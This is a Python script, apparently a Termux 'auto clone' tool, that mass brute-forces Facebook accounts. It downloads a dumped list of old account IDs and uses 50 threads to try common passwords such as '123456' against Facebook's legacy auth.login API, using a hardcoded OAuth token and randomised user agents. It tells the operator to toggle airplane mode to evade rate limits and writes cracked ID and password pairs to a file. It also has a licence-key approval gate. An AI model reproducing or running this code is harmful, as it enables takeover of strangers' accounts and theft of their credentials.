import os, time, sys, requests, uuid, random
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#--- [ PREMIUM DESIGN COLORS ] ---#
G = '\033[1;92m' 
Y = '\033[1;93m' 
W = '\033[1;97m' 
R = '\033[1;91m'
S = '\033[1;96m'
P = '\033[1;95m'

loop, oks = 0, []

#--- [ APPROVAL SYSTEM ] ---#
def approval():
    os.system('clear')
    # Unique Key Generation
    key = f"SHAHIN-ACTIVE-{os.getlogin().upper()}-{str(uuid.getnode())[:4]}"
    approval_url = "https://raw.githubusercontent.com/w8Shahin/Approval-control/main/Keys.txt"
    
    print(f"{G} [√] SHAHIN BIN AHMED PREMIUM SYSTEM")
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    try:
        active_keys = requests.get(approval_url).text
        if key in active_keys:
            Main()
        else:
            print(f" {R}[×] STATUS : NOT APPROVED")
            print(f" {W}[•] YOUR KEY : {G}{key}")
            print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            input(f" {G}[ENTER] TO SEND KEY...")
            os.system(f'termux-open-url "https://wa.me/+8801XXXXXXXXX?text=Approve%20My%20Key:%20{key}"')
            sys.exit()
    except: print(f" {R}[!] SERVER ERROR"); sys.exit()

#--- [ PREMIUM INTERFACE ] ---#
def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ 
 {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {G}[+] DEVELOPER : SHAHIN BIN AHMED
 {G}[+] TOOL FOR  : {W}OLD {G} ACTIVE CLONE
 {G}[+] METHOD    : {W}M2 (VIP DETECTION)
 {G}[+] STATUS    : {P}PREMIUM
 {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')

def Main():
    logo()
    print(f' {G}[1]{W} AUTO CLONE OLD ACTIVE IDS (M2 METHOD)')
    print(f' {G}[2]{W} CLONE FROM FILE')
    print(f' {G}[0]{W} EXIT')
    line()
    opt = input(f' {W}[•] CHOOSE : {G}')
    
    if opt == '1':
        print(f" {W}[•] Downloading Active Old IDs..."); time.sleep(1)
        url = "https://raw.githubusercontent.com/Social-Engineer-Tool/dumps/main/bd_old_ids.txt"
        data = requests.get(url).text
        open('active.txt','w').write(data)
        start_cloning('active.txt')
    elif opt == '2':
        path = input(f" {W}[+] FILE PATH : {G}")
        start_cloning(path)
    else: exit()

def line():
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

#--- [ CLONING ENGINE ] ---#
def start_cloning(path):
    ids = open(path,'r').read().splitlines()
    logo()
    print(f" {G}[√] TOTAL ID : {len(ids)}  {G}METHOD : M2")
    print(f" {G}[√] TURN {R}(ON/OFF){G} AIRPLANE MODE EVERY 4 MIN")
    line()
    
    with ThreadPool(max_workers=50) as engine:
        for user in ids:
            uid = user.split('|')[0]
            # Apnar Golden Passwords + Name Base Passwords
            pws = ['123456', '1234567', '12345678', '123456789']
            engine.submit(crack_engine, uid, pws, len(ids))

def crack_engine(uid, pws, limit):
    global loop, oks
    # NO RISK tool-er moto specific User-Agent logic
    ua = f"Mozilla/5.0 (Linux; Android {random.randint(4,10)}; SM-G{random.randint(100,900)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70,110)}.0.{random.randint(1000,5000)}.0 Mobile Safari/537.36"
    
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        data = {'email': uid, 'password': pw, 'format': 'json'}
        try:
            res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
            if 'session_key' in res:
                # NO RISK style result display with year detection logic
                year = "2010/2011" if uid.startswith('10000') else "OLD"
                print(f'\r{G}[SHAHIN-OK] {uid} > {pw} • {year}{W}')
                oks.append(uid)
                open('/sdcard/SHAHIN-M2-OK.txt', 'a').write(uid+'|'+pw+'\n')
                break
            elif 'checkpoint' in str(res):
                break
        except: pass
            
    loop += 1
    # Scanning animation like NO RISK
    sys.stdout.write(f'\r {S}[SHAHIN-M2]-[{loop}]-[OK-{len(oks)}] '); sys.stdout.flush()

if __name__ == "__main__":
    approval()
